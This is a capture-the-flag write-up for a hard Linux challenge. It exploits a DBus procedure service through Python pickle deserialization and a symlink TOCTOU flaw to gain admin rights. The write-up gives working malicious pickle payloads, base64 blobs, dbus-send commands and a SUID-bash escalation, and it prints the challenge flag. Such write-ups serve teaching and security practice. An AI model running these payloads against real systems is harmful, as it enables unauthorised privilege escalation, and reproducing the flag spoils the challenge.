# Movie Night #2

### Category

System

### Difficulty

Hard

### Author

Log_s

### Description

*Howard Payne*: Pop quiz, hotshot. There's a bomb on a bus. Once the bus goes 50 miles an hour, the bomb is armed. If it drops below 50, it blows up. What do you do? What do you do?

\- ***Speed (1994)***

===

The flag for this challenge is located at `/home/admin/flag.txt`. The challenge to deploy is the same as for the the challenge "Movie Night #1".

DEPLOY: [https://deploy.heroctf.fr](https://deploy.heroctf.fr)

### Write Up

#### Recon of the DBus Service

Upon connecting to the challenge, we notice a procedure processing service running as a systemd service. We can discover available DBus services using the `dbus-send` command or by inspecting the system bus:

```
user@movie-night:~$ dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames
method return time=1763302043.166925 sender=org.freedesktop.DBus -> destination=:1.3 serial=3 reply_serial=2
   array [
      string "org.freedesktop.DBus"
      string ":1.3"
      string "com.system.ProcedureService"
      string ":1.0"
   ]
```

The service `com.system.ProcedureService` is available on the system bus. We can inspect its methods using introspection:

```
user@movie-night:~$ dbus-send --system --print-reply --dest=com.system.ProcedureService /com/system/ProcedureService org.freedesktop.DBus.Introspectable.Introspect
method return time=1763302076.592756 sender=:1.0 -> destination=:1.4 serial=3 reply_serial=2
   string "<!DOCTYPE node PUBLIC "-//freedesktop//DTD D-BUS Object Introspection 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/introspect.dtd">
<node name="/com/system/ProcedureService">
  <interface name="org.freedesktop.DBus.Introspectable">
    <method name="Introspect">
      <arg direction="out" type="s" />
    </method>
  </interface>
  <interface name="com.system.ProcedureService">
    <method name="RegisterProcedure">
      <arg direction="in"  type="s" name="name" />
      <arg direction="in"  type="s" name="serialized_code" />
      <arg direction="out" type="s" />
    </method>
    <method name="ListProcedures">
      <arg direction="out" type="as" />
    </method>
    <method name="ExecuteProcedure">
      <arg direction="in"  type="s" name="name" />
      <arg direction="out" type="s" />
    </method>
    <method name="RemoveProcedure">
      <arg direction="in"  type="s" name="name" />
      <arg direction="out" type="s" />
    </method>
    <method name="GetStatus">
      <arg direction="out" type="s" />
    </method>
  </interface>
</node>
"
```

This reveals several methods:
- `RegisterProcedure(name, serialized_code)` - Register a procedure with serialized code
- `ListProcedures()` - List all procedures owned by the caller
- `ExecuteProcedure(name)` - Execute a procedure by name
- `RemoveProcedure(name)` - Remove a procedure
- `GetStatus()` - Get service status

The detailed code of the service is available when solving the previous challenge, and getting access to `/home/dev/procservice_src/`.

#### Example of Usage

The service is designed to allow users to register and execute Python procedures. Here is an example of a simple procedure.

```python
import base64
import pickle

code = """
import os
os.system("whoami > /tmp/whoami_user.txt")
print("Hello world")
"""

serialized = base64.b64encode(pickle.dumps(code)).decode('utf-8')
print(serialized)
# gASVTwAAAAAAAACMSwppbXBvcnQgb3MKb3Muc3lzdGVtKCJ3aG9hbWkgPiAvdG1wL3dob2FtaV91c2VyLnR4dCIpCnByaW50KCJIZWxsbyB3b3JsZCIpCpQu
```

We can register it using the `RegisterProcedure` method:
```
user@movie-night:~$ dbus-send --system --print-reply --dest=com.system.ProcedureService /com/system/ProcedureService com.system.ProcedureService.RegisterProcedure string:"helloworld" string:"gASVTwAAAAAAAACMSwppbXBvcnQgb3MKb3Muc3lzdGVtKCJ3aG9hbWkgPiAvdG1wL3dob2FtaV91c2VyLnR4dCIpCnByaW50KCJIZWxsbyB3b3JsZCIpCpQu"
method return time=1763303982.964661 sender=:1.0 -> destination=:1.6 serial=6 reply_serial=2
   string "Procedure 'helloworld' registered successfully"
```

We can check that the procedure is registered using the `ListProcedures` method:
```
user@movie-night:~$ dbus-send --system --print-reply --dest=com.system.ProcedureService /com/system/ProcedureService com.system.ProcedureService.ListProcedures
method return time=1763304008.049638 sender=:1.0 -> destination=:1.7 serial=9 reply_serial=2
   array [
      string "helloworld"
   ]
```

Finally, we can execute the procedure using the `ExecuteProcedure` method:
```
user@movie-night:~$ dbus-send --system --print-reply --dest=com.system.ProcedureService /com/system/ProcedureService com.system.ProcedureService.ExecuteProcedure string:"helloworld"
method return time=1763304255.613048 sender=:1.0 -> destination=:1.10 serial=14 reply_serial=2
   string "Hello world
"
user@movie-night:~$ cat /tmp/whoami_user.txt
user
```

The service stores procedures as pickle files in `/var/procedures/` with the format `<uuid>_<name>.pkl`, owned by the user who registered them. This can be verified with the source code:
```python
# Decode the base64-encoded data
try:
    decoded = base64.b64decode(serialized_code)
except Exception as e:
    logger.error(f"Base64 decode error: {e}")
    return f"Error: Invalid base64 data - {e}"

# Get caller UID
caller_uid = get_caller_uid(sender)
if caller_uid is None:
    return "Error: Could not determine caller UID"

# Prevent same user from registering multiple procedures with the same name
# Look for any file named *_<name>.pkl owned by this user
pattern = os.path.join(self.procedures_dir, f"*_{name}.pkl")
for proc_path in glob.glob(pattern):
    try:
        stat_info = os.stat(proc_path)
        if stat_info.st_uid == caller_uid:
            logger.info(f"User {caller_uid} already has a procedure named '{name}'")
            return f"Error: Procedure with name '{name}' already exists for this user"
    except Exception as stat_err:
        logger.error(f"Error checking file {proc_path}: {stat_err}")

# Create filename
filename = f"{uuid.uuid4()}_{name}.pkl"
filepath = os.path.join(self.procedures_dir, filename)

# Save the pickle file
with open(filepath, 'wb') as f:
    f.write(decoded)

# Set file ownership to caller
os.chown(filepath, caller_uid, caller_uid)
```

The folder `/var/procedures/` is however owned by the `dbus-service` user (UID 1005), which means even if we own the file storing the procedure, we cannot tamper with it.

#### Pickle Deserialization Vulnerability

Python's `pickle` module is used to serialize and deserialize Python objects (`lib/load_pickle.py`). However, pickle is inherently unsafe - deserializing untrusted data can lead to arbitrary code execution. When `pickle.loads()` is called, it can execute arbitrary Python code through the `__reduce__` method, which allows objects to specify how they should be reconstructed.

For more information on pickle security, see: [Python Pickle Security](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

The first vulnerability in this challenge is that the service unpickles user-controlled data. When `ExecuteProcedure` is called, it unpickles the file using `lib/load_pickle.py`, which runs as the `dbus-service` user (UID 1005). This means we can achieve Remote Code Execution (RCE) as the `dbus-service` user.

Here's an example of achieving RCE as the `dbus-service` user. First, we create the malicious pickle:

```python
import pickle
import base64

class Exploit(object):
    def __reduce__(self):
        return (__import__('os').system, ('whoami > /tmp/whoami_dbus.txt',))

pickle_data = base64.b64encode(pickle.dumps(Exploit())).decode('utf-8')
print(pickle_data)
# gASVOAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB13aG9hbWkgPiAvdG1wL3dob2FtaV9kYnVzLnR4dJSFlFKULg==
```

Then we register and execute it using `dbus-send`:
```
user@movie-night:~$ dbus-send --system --print-reply --dest=com.system.ProcedureService /com/system/ProcedureService com.system.ProcedureService.RegisterProcedure string:"dbusrce" string:"gASVOAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB13aG9hbWkgPiAvdG1wL3dob2FtaV9kYnVzLnR4dJSFlFKULg=="
method return time=1763304398.901872 sender=:1.0 -> destination=:1.11 serial=17 reply_serial=2
   string "Procedure 'dbusrce' registered successfully

user@movie-night:~$ dbus-send --system --print-reply --dest=com.system.ProcedureService /com/system/ProcedureService com.system.ProcedureService.ExecuteProcedure string:"dbusrce"
method return time=1763304413.738381 sender=:1.0 -> destination=:1.12 serial=18 reply_serial=2
   string ""

user@movie-night:~$ cat /tmp/whoami_dbus.txt
dbus-service
```

#### The TOCTOU Vulnerability

TOCTOU stands for "Time-Of-Check-Time-Of-Use". It's a race condition vulnerability where a resource is checked at one time, but used at a later time, and the resource may have changed between these two operations.

An important detail is that when Python's `os.stat()` function is called on a file path, it follows symlinks. This means if a symlink is created pointing to a different file, `os.stat()` will return the metadata of the target file, not the symlink itself. This behavior is crucial for exploiting the TOCTOU vulnerability in this challenge.

Looking at the `ExecuteProcedure` method in the service code:

```python
def ExecuteProcedure(self, name, sender=None):
    # ... find the file ...
    filepath = matching_files[0]
    
    if not os.path.exists(filepath):
        return f"Error: Procedure '{name}' not found"
    
    # Unpickle code (runs as dbus-service user)
    obj_repr, error = unpickle_file(filepath)
    
    # Check file ownership (AFTER unpickling!)
    file_stat = os.stat(filepath)
    file_owner_uid = file_stat.st_uid
    
    # Execute code with as the file owner
    result = execute_as_user(obj_repr, file_owner_uid)
```

The vulnerability is that:
1. The file is unpickled
2. The ownership check happens **after** unpickling
3. Between these two operations, we can change what file `filepath` points to using a symlink

So the only remaning challenge, is to create a payload, that will work in 2 stages:
1. The first stage needs to be executed during the unpickling process, as dbus-service user (since he runs the unpickling process and is the only user with access the `/var/procedures/` folder)
2. The first stage still needs to yield valid python code (the second stage), to be executed as the file owner (in order to get RCE as admin user)

#### Two stage payload

To exploit the pickle deserialization, we need to create a malicious pickle object. Pickling an object only stores references to external objects, they are not included in the serialized data. This means we can only access functions that are available in the context of the unpickling code.

However, we notice that the deserialization happens in `lib/load_pickle.py`, which is in the same directory as the `utils.py` file, which contains the `execute_as_user` function. We can leverage this by creating a pickle that calls `execute_as_user` with arbitrary code (our first stage), and returns the code for the second stage. The second stage will passed down to the normal dbus service flow, and executed.

First, we need to create the `utils.py` file in our working directory so that our exploit can import it:
```python
# utils.py
def execute_as_user(code, uid):
    return 0 # The content is not important, as long as the function's signature matches the actual execute_as_user function
```

Now we can create a pickle exploit:
```python
import pickle
import base64
import utils

class Exploit(object):
    def __reduce__(self):
        return (utils.execute_as_user, ('''import os
os.system("ln -sf /home/admin/flag.txt /var/procedures/*_exploit.pkl > /dev/null 2>&1")
stage2 = """
import os
os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
"""
print(stage2)''', 1005)) # 1005 is the UID of the dbus-service user

pickle_data = base64.b64encode(pickle.dumps(Exploit())).decode('utf-8')
print(pickle_data)
# gASV6wAAAAAAAACMBXV0aWxzlIwPZXhlY3V0ZV9hc191c2VylJOUjMRpbXBvcnQgb3MKb3Muc3lzdGVtKCJsbiAtc2YgL2hvbWUvYWRtaW4vZmxhZy50eHQgL3Zhci9wcm9jZWR1cmVzLypfZXhwbG9pdC5wa2wgPiAvZGV2L251bGwgMj4mMSIpCnN0YWdlMiA9ICIiIgppbXBvcnQgb3MKb3Muc3lzdGVtKCJjcCAvYmluL2Jhc2ggL3RtcC9iYXNoICYmIGNobW9kICtzIC90bXAvYmFzaCIpCiIiIgpwcmludChzdGFnZTIplE3tA4aUUpQu
```

We can then register and execute the exploit using `dbus-send`:

```
user@movie-night:~$ dbus-send --system --print-reply --dest=com.system.ProcedureService /com/system/ProcedureService com.system.ProcedureService.RegisterProcedure string:"exploit" string:"gASV6wAAAAAAAACMBXV0aWxzlIwPZXhlY3V0ZV9hc191c2VylJOUjMRpbXBvcnQgb3MKb3Muc3lzdGVtKCJsbiAtc2YgL2hvbWUvYWRtaW4vZmxhZy50eHQgL3Zhci9wcm9jZWR1cmVzLypfZXhwbG9pdC5wa2wgPiAvZGV2L251bGwgMj4mMSIpCnN0YWdlMiA9ICIiIgppbXBvcnQgb3MKb3Muc3lzdGVtKCJjcCAvYmluL2Jhc2ggL3RtcC9iYXNoICYmIGNobW9kICtzIC90bXAvYmFzaCIpCiIiIgpwcmludChzdGFnZTIplE3tA4aUUpQu"
method return time=1763304726.761327 sender=:1.0 -> destination=:1.15 serial=25 reply_serial=2
   string "Procedure 'exploit' registered successfully"

user@movie-night:~$ dbus-send --system --print-reply --dest=com.system.ProcedureService /com/system/ProcedureService com.system.ProcedureService.ExecuteProcedure string:"exploit"
method return time=1763304737.973630 sender=:1.0 -> destination=:1.16 serial=26 reply_serial=2
   string ""

user@movie-night:~$ ls -l /tmp/bash
-rwsr-sr-x 1 admin admin 1265648 Nov 16 14:52 /tmp/bash

user@movie-night:~$ /tmp/bash -p
bash-5.2$ id
uid=1001(user) gid=1001(user) euid=1004(admin) egid=1004(admin) groups=1004(admin),100(users),1001(user)
bash-5.2$ cat /home/admin/flag.txt
Hero{d0ubl3_rc3_ftw_ad57172613c7d5403a671fd7878a659d}
```

The exploit works as follows:
1. **First RCE (as dbus-service)**: During unpickling, the code runs as `dbus-service` user. The shell command creates a symlink at our procedure file path (the glob `*_exploit.pkl` expands to the actual file path like `/var/procedures/<uuid>_exploit.pkl`), pointing to an admin-owned file (the flag file in this case).
2. **TOCTOU window**: The service checks file ownership after unpickling. When it calls `os.stat(filepath)`, it follows the symlink and checks the ownership of the admin file instead of our original file.
3. **Second RCE (as admin)**: Since the ownership check sees an admin-owned file, the code executes as admin (UID of admin user), creating a SUID bash binary that we can use to read the flag.

#### Alternative Solution: Race Condition for TOCTOU

Instead of using a symlink during unpickling, we could also exploit the TOCTOU by racing the file ownership check. We could:

1. Register a procedure
2. Start executing it
3. Rapidly create a symlink in a tight loop targeting the procedure file
4. If we win the race, the symlink points to an admin file when ownership is checked

However, the approach shown above is more reliable because we control the timing during the unpickling phase, which gives us a guaranteed window to create the symlink. Moreover, to encourage people to solve the challenge with the more interesting approach, a watchdog process has been added, to kill any process ran as dbus-service, whose parent is not the dbus-service user itself, or root. Racing the watchdog is possible, but difficult. Solving the challenge using the race will require winning the race against the watchdog and for the challenge itself, which is very unlikely.

### Flag

Hero{d0ubl3_rc3_ftw_ad57172613c7d5403a671fd7878a659d}
